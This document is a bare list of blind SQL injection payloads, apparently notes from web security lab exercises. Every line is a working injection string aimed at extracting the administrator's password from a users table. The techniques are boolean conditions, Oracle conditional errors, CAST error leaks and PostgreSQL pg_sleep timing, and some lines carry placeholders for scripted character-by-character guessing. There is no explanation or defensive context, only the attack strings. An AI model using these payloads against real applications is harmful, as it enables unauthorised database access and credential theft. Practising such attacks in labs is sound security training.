'OTGPGrO1NBCCUGJR' and substr((select length(password) from users where username='administrator'),1,5)=12--

'7Bl7OKLe4ahLtel4' and substr('abc',1,1)='a' --


'DXbj3SI9rkIUb9Pr' and (select LENGTH(password) from users where username='administrator')=1 --

'wJ1Y2YAty7Y3ZTVR' and (select substr(password, 1,1) from users where username='administrator')='{}' --


'ukuwnop85AgZgXU8' and (select case when (1=2) then TO_CHAR(1/0) else 'a' end from dual)='a' --

'ukuwnop85AgZgXU8' and (select case when (length(password) = 1) then 'a' else TO_CHAR(1/0) end from users where username='administrator')='a'

'ukuwnop85AgZgXU8' and (select case when (substr(password,1,1) = 'a') then 'a' else TO_CHAR(1/0) end from users where username='administrator')='a'

'0THea3ltAmrWaHjM' and cast((select password from users where username='administrator') AS INT)=1 --
'osXYG6cUam8SbXSS'; SELECT CASE WHEN (length(password)={}) THEN pg_sleep(2) ELSE pg_sleep(0) END from users where username='administrator' --